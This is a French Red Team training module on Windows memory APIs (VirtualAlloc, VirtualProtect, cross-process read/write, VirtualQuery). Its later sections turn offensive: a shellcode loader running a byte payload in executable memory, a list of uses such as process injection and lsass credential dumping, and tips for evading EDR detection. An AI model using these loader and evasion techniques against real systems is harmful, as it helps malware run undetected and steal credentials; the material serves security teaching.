# Module W03 : Gestion Mémoire Windows

## Objectifs

A la fin de ce module, vous serez capable de :
- Comprendre l'architecture mémoire virtuelle de Windows
- Utiliser les API de gestion mémoire (VirtualAlloc, VirtualProtect, etc.)
- Lire et écrire dans la mémoire d'autres processus
- Appliquer ces techniques dans un contexte Red Team

---

## 1. Architecture Mémoire Virtuelle Windows

### 1.1 Qu'est-ce que la Mémoire Virtuelle ?

**Analogie** : Imaginez un grand immeuble (mémoire physique) avec des appartements numérotés. Chaque locataire (processus) reçoit un plan personnalisé où son appartement 1 peut en réalité être l'appartement 523 de l'immeuble. C'est la virtualisation !

**Mémoire Virtuelle** : Chaque processus possède son propre espace d'adressage isolé (généralement 4 GB en 32-bit, 128 TB en 64-bit).

```ascii
PROCESSUS A (vue isolée)          PROCESSUS B (vue isolée)
┌─────────────────────┐           ┌─────────────────────┐
│ 0x7FFF'FFFF'FFFF    │           │ 0x7FFF'FFFF'FFFF    │
│ ┌─────────────────┐ │           │ ┌─────────────────┐ │
│ │  User Space     │ │           │ │  User Space     │ │
│ │  (Accessible)   │ │           │ │  (Accessible)   │ │
│ ├─────────────────┤ │           │ ├─────────────────┤ │
│ │  Stack          │ │           │ │  Stack          │ │
│ ├─────────────────┤ │           │ ├─────────────────┤ │
│ │  Heap           │ │           │ │  Heap           │ │
│ ├─────────────────┤ │           │ ├─────────────────┤ │
│ │  DLLs           │ │           │ │  DLLs           │ │
│ ├─────────────────┤ │           │ ├─────────────────┤ │
│ │  .data, .bss    │ │           │ │  .data, .bss    │ │
│ ├─────────────────┤ │           │ ├─────────────────┤ │
│ │  .text (code)   │ │           │ │  .text (code)   │ │
│ └─────────────────┘ │           │ └─────────────────┘ │
│ 0x0000'0000'0000    │           │ 0x0000'0000'0000    │
├─────────────────────┤           ├─────────────────────┤
│ 0x8000'0000'0000    │           │ 0x8000'0000'0000    │
│ ┌─────────────────┐ │           │ ┌─────────────────┐ │
│ │  Kernel Space   │ │           │ │  Kernel Space   │ │
│ │  (Protégé)      │◄┼───────────┼─┤  (PARTAGÉ !)    │ │
│ └─────────────────┘ │           │ └─────────────────┘ │
└─────────────────────┘           └─────────────────────┘
```

### 1.2 Pages Mémoire

La mémoire est divisée en **pages** (généralement 4 KB).

```ascii
Adresse Virtuelle → Traduction → Adresse Physique

Page 0 : 0x0000 - 0x0FFF  →  RAM 0x12340000
Page 1 : 0x1000 - 0x1FFF  →  RAM 0x56780000
Page 2 : 0x2000 - 0x2FFF  →  Non mappée (Page Fault si accès)
```

### 1.3 Permissions de Pages (Protection)

Chaque page possède des flags de protection :

| Flag | Signification |
|------|---------------|
| `PAGE_NOACCESS` | Aucun accès (crash si accès) |
| `PAGE_READONLY` | Lecture seule |
| `PAGE_READWRITE` | Lecture + Écriture |
| `PAGE_EXECUTE` | Exécution seule |
| `PAGE_EXECUTE_READ` | Exécution + Lecture |
| `PAGE_EXECUTE_READWRITE` | Exécution + Lecture + Écriture (RWX - dangereux !) |

---

## 2. VirtualAlloc - Allouer de la Mémoire

### 2.1 Principe

`VirtualAlloc` réserve et/ou commit des pages dans l'espace d'adressage du processus.

**Deux étapes** :
1. **RESERVE** : Réserver une zone (marquer comme utilisée, mais pas de RAM allouée)
2. **COMMIT** : Allouer réellement de la RAM physique

```ascii
RESERVE (rapide)          COMMIT (alloue RAM)
┌─────────────┐          ┌─────────────┐
│  Adresse    │          │  Adresse    │
│  Réservée   │   ───►   │  + RAM      │
│  (virtuel)  │          │  (réel)     │
└─────────────┘          └─────────────┘
```

### 2.2 Syntaxe

```c
LPVOID VirtualAlloc(
    LPVOID lpAddress,        // Adresse souhaitée (NULL = auto)
    SIZE_T dwSize,           // Taille en bytes
    DWORD  flAllocationType, // MEM_RESERVE | MEM_COMMIT
    DWORD  flProtect         // PAGE_READWRITE, etc.
);
```

### 2.3 Exemple Basique

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Allouer 4096 bytes (1 page) en RW
    LPVOID addr = VirtualAlloc(
        NULL,                    // Laisse Windows choisir l'adresse
        4096,                    // 1 page
        MEM_COMMIT | MEM_RESERVE, // Réserver + Commiter
        PAGE_READWRITE           // Lecture/Écriture
    );

    if (addr == NULL) {
        printf("Erreur VirtualAlloc: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Mémoire allouée à: 0x%p\n", addr);

    // Utiliser la mémoire
    strcpy((char*)addr, "Hello from allocated memory!");
    printf("[+] Contenu: %s\n", (char*)addr);

    // Libérer la mémoire
    VirtualFree(addr, 0, MEM_RELEASE);
    printf("[+] Mémoire libérée\n");

    return 0;
}
```

**Compilation** :
```bash
cl /nologo memory_alloc.c
```

---

## 3. VirtualProtect - Modifier les Permissions

### 3.1 Principe

`VirtualProtect` change les permissions d'une zone mémoire **déjà allouée**.

**Cas d'usage Red Team** : Passer une zone RW (où on écrit du shellcode) en RX (exécutable).

### 3.2 Syntaxe

```c
BOOL VirtualProtect(
    LPVOID lpAddress,        // Adresse de la zone
    SIZE_T dwSize,           // Taille
    DWORD  flNewProtect,     // Nouvelle protection
    PDWORD lpflOldProtect    // Ancienne protection (out)
);
```

### 3.3 Exemple - Exécuter du Shellcode

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Shellcode simple (ret en x64) : 0xC3
    unsigned char shellcode[] = "\xC3";

    // 1. Allouer mémoire RW
    LPVOID exec_mem = VirtualAlloc(NULL, sizeof(shellcode),
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_READWRITE);

    if (!exec_mem) {
        printf("[-] VirtualAlloc échoué\n");
        return 1;
    }

    printf("[+] Mémoire allouée: 0x%p\n", exec_mem);

    // 2. Copier le shellcode
    memcpy(exec_mem, shellcode, sizeof(shellcode));
    printf("[+] Shellcode copié\n");

    // 3. Changer protection en RX (exécutable)
    DWORD oldProtect;
    if (!VirtualProtect(exec_mem, sizeof(shellcode),
                        PAGE_EXECUTE_READ, &oldProtect)) {
        printf("[-] VirtualProtect échoué\n");
        return 1;
    }

    printf("[+] Protection changée: RW -> RX\n");

    // 4. Exécuter le shellcode
    void (*func)() = (void(*)())exec_mem;
    func();
    printf("[+] Shellcode exécuté avec succès\n");

    // 5. Nettoyer
    VirtualFree(exec_mem, 0, MEM_RELEASE);

    return 0;
}
```

---

## 4. Mémoire Cross-Process

### 4.1 Principe

Windows permet de lire/écrire dans la mémoire d'**autres processus** (si permissions suffisantes).

```ascii
PROCESSUS A                    PROCESSUS B
┌─────────────┐                ┌─────────────┐
│  Code       │                │  Code       │
│  Données    │   ◄──────┐     │  Données    │
│  0x1234     │          │     │  Password!  │
└─────────────┘          │     └─────────────┘
                         │
            ReadProcessMemory()
            WriteProcessMemory()
```

### 4.2 ReadProcessMemory

**Syntaxe** :
```c
BOOL ReadProcessMemory(
    HANDLE  hProcess,           // Handle du processus cible
    LPCVOID lpBaseAddress,      // Adresse à lire
    LPVOID  lpBuffer,           // Buffer de destination
    SIZE_T  nSize,              // Taille à lire
    SIZE_T  *lpNumberOfBytesRead // Bytes lus (out)
);
```

**Exemple** :
```c
#include <windows.h>
#include <stdio.h>

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Usage: %s <PID> <Address>\n", argv[0]);
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    LPVOID addr = (LPVOID)strtoull(argv[2], NULL, 16);

    // Ouvrir le processus cible
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_READ,  // Permission de lecture mémoire
        FALSE,
        pid
    );

    if (!hProcess) {
        printf("[-] OpenProcess échoué: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Handle obtenu: 0x%p\n", hProcess);

    // Lire 64 bytes
    char buffer[64] = {0};
    SIZE_T bytesRead;

    if (ReadProcessMemory(hProcess, addr, buffer, sizeof(buffer), &bytesRead)) {
        printf("[+] Lu %zu bytes à 0x%p:\n", bytesRead, addr);

        // Affichage hexadécimal
        for (int i = 0; i < bytesRead; i++) {
            printf("%02X ", (unsigned char)buffer[i]);
            if ((i + 1) % 16 == 0) printf("\n");
        }
        printf("\n");
    } else {
        printf("[-] ReadProcessMemory échoué: %lu\n", GetLastError());
    }

    CloseHandle(hProcess);
    return 0;
}
```

### 4.3 WriteProcessMemory

**Syntaxe** :
```c
BOOL WriteProcessMemory(
    HANDLE  hProcess,
    LPVOID  lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T  nSize,
    SIZE_T  *lpNumberOfBytesWritten
);
```

**Exemple - Patch un byte** :
```c
HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);

unsigned char patch = 0x90; // NOP instruction
LPVOID patchAddr = (LPVOID)0x00401000;

if (WriteProcessMemory(hProcess, patchAddr, &patch, 1, NULL)) {
    printf("[+] Byte patché avec succès\n");
} else {
    printf("[-] WriteProcessMemory échoué: %lu\n", GetLastError());
}

CloseHandle(hProcess);
```

### 4.4 VirtualAllocEx - Allouer dans un Processus Distant

```c
LPVOID VirtualAllocEx(
    HANDLE hProcess,        // Handle du processus cible
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
);
```

**Exemple** :
```c
HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION, FALSE, pid);

LPVOID remoteAddr = VirtualAllocEx(
    hProcess,
    NULL,
    4096,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_READWRITE
);

if (remoteAddr) {
    printf("[+] Mémoire allouée dans processus distant: 0x%p\n", remoteAddr);

    // Écrire des données
    char data[] = "Injected data";
    WriteProcessMemory(hProcess, remoteAddr, data, sizeof(data), NULL);
}

CloseHandle(hProcess);
```

---

## 5. VirtualQuery - Interroger la Mémoire

### 5.1 Principe

`VirtualQuery` récupère des informations sur une région mémoire.

```c
SIZE_T VirtualQuery(
    LPCVOID                   lpAddress,
    PMEMORY_BASIC_INFORMATION lpBuffer,
    SIZE_T                    dwLength
);
```

### 5.2 Structure MEMORY_BASIC_INFORMATION

```c
typedef struct _MEMORY_BASIC_INFORMATION {
    PVOID  BaseAddress;       // Adresse de base de la région
    PVOID  AllocationBase;    // Base de l'allocation initiale
    DWORD  AllocationProtect; // Protection initiale
    SIZE_T RegionSize;        // Taille de la région
    DWORD  State;             // MEM_COMMIT, MEM_RESERVE, MEM_FREE
    DWORD  Protect;           // Protection actuelle
    DWORD  Type;              // MEM_IMAGE, MEM_MAPPED, MEM_PRIVATE
} MEMORY_BASIC_INFORMATION;
```

### 5.3 Exemple - Scanner la Mémoire

```c
#include <windows.h>
#include <stdio.h>

int main() {
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID addr = NULL;

    printf("Scan de la mémoire du processus:\n");
    printf("%-16s %-10s %-10s %s\n", "Adresse", "Taille", "State", "Protection");
    printf("─────────────────────────────────────────────────────\n");

    while (VirtualQuery(addr, &mbi, sizeof(mbi))) {
        // Afficher uniquement les pages commitées
        if (mbi.State == MEM_COMMIT) {
            char *protect = "";
            switch (mbi.Protect) {
                case PAGE_READWRITE:        protect = "RW-"; break;
                case PAGE_EXECUTE_READ:     protect = "R-X"; break;
                case PAGE_EXECUTE_READWRITE: protect = "RWX"; break;
                case PAGE_READONLY:         protect = "R--"; break;
                default:                    protect = "???"; break;
            }

            printf("0x%-14p %-10zu COMMIT     %s\n",
                   mbi.BaseAddress, mbi.RegionSize, protect);
        }

        // Passer à la région suivante
        addr = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
    }

    return 0;
}
```

---

## 6. Applications Offensives

### 6.1 Contexte Red Team

Les fonctions mémoire Windows sont **essentielles** pour :

1. **Shellcode Injection** : Allouer de la mémoire RWX et y exécuter du code
2. **DLL Injection** : Allouer et écrire le path d'une DLL dans un processus distant
3. **Process Hollowing** : Remplacer le code d'un processus légitime
4. **Hooking** : Modifier les instructions d'une fonction en mémoire
5. **Credential Dumping** : Lire la mémoire de lsass.exe pour extraire des credentials

### 6.2 Exemple - Injection Simple de Shellcode

```c
#include <windows.h>
#include <stdio.h>

// MessageBox shellcode (x64) - "Hello" - "World"
unsigned char payload[] =
    "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
    "\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
    "\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x83\xC4\x28\xC3\xCC"
    "\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\x48\x89\x5C\x24\x08"
    "\x57\x48\x83\xEC\x20\x65\x48\x8B\x04\x25\x60\x00\x00\x00\x48"
    "\x8B\x40\x18\x48\x8B\x58\x20\x48\x8B\x3B\x48\x8B\x5F\x20\x48"
    "\x8B\x1B\x48\x8B\x1B\x48\x8B\x43\x20\x49\x89\xC0\x48\x8B\x88"
    "\x88\x00\x00\x00\x48\x89\xCA\x48\xC1\xEA\x20\x8B\x0C\x91\x48"
    "\x01\xC1\xE8\x8A\x00\x00\x00\x48\x8B\x5C\x24\x30\x48\x83\xC4"
    "\x20\x5F\xC3\x00\x00\x48\x65\x6C\x6C\x6F\x00\x57\x6F\x72\x6C"
    "\x64\x00\x75\x73\x65\x72\x33\x32\x2E\x64\x6C\x6C\x00";

int main() {
    printf("[*] Taille du payload: %zu bytes\n", sizeof(payload));

    // 1. Allouer mémoire exécutable
    LPVOID exec_mem = VirtualAlloc(
        NULL,
        sizeof(payload),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE  // RWX
    );

    if (!exec_mem) {
        printf("[-] VirtualAlloc failed: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Mémoire allouée: 0x%p\n", exec_mem);

    // 2. Copier le shellcode
    memcpy(exec_mem, payload, sizeof(payload));
    printf("[+] Shellcode copié\n");

    // 3. Créer un thread pour l'exécuter
    HANDLE hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)exec_mem,
        NULL,
        0,
        NULL
    );

    if (!hThread) {
        printf("[-] CreateThread failed: %lu\n", GetLastError());
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return 1;
    }

    printf("[+] Thread créé, exécution du shellcode...\n");

    // 4. Attendre la fin
    WaitForSingleObject(hThread, INFINITE);

    // 5. Nettoyer
    CloseHandle(hThread);
    VirtualFree(exec_mem, 0, MEM_RELEASE);

    printf("[+] Terminé\n");
    return 0;
}
```

### 6.3 Considérations OPSEC

**Problèmes détectés par les EDR** :

1. **Mémoire RWX** : Les EDR scannent les allocations avec `PAGE_EXECUTE_READWRITE`
   - **Solution** : Allouer en RW, puis passer en RX avec VirtualProtect

2. **WriteProcessMemory sur processus distant** : Très surveillé
   - **Solution** : Utiliser des techniques plus furtives (APC injection, etc.)

3. **Allocations dans des zones suspectes**
   - **Solution** : Utiliser des zones légitimes (cave code dans DLL existantes)

**Amélioration OPSEC** :
```c
// Au lieu de :
VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

// Faire :
LPVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);
memcpy(mem, shellcode, size);
DWORD old;
VirtualProtect(mem, size, PAGE_EXECUTE_READ, &old); // RW -> RX
```

---

## 7. Checklist

- [ ] Comprendre le concept de mémoire virtuelle
- [ ] Savoir allouer de la mémoire avec `VirtualAlloc`
- [ ] Modifier les permissions avec `VirtualProtect`
- [ ] Lire/écrire dans un processus distant
- [ ] Scanner la mémoire avec `VirtualQuery`
- [ ] Exécuter du shellcode en mémoire
- [ ] Comprendre les implications OPSEC

---

## 8. Exercices

Voir [exercice.md](exercice.md)

---

## 9. Ressources Complémentaires

- [MSDN - Memory Management](https://docs.microsoft.com/en-us/windows/win32/memory/memory-management)
- [VirtualAlloc Documentation](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
- [VirtualProtect Documentation](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [Windows Internals - Memory Management](https://docs.microsoft.com/en-us/sysinternals/resources/windows-internals)

---

**Navigation**
- [Module précédent](../W02_processes_threads/)
- [Module suivant](../W04_file_operations/)
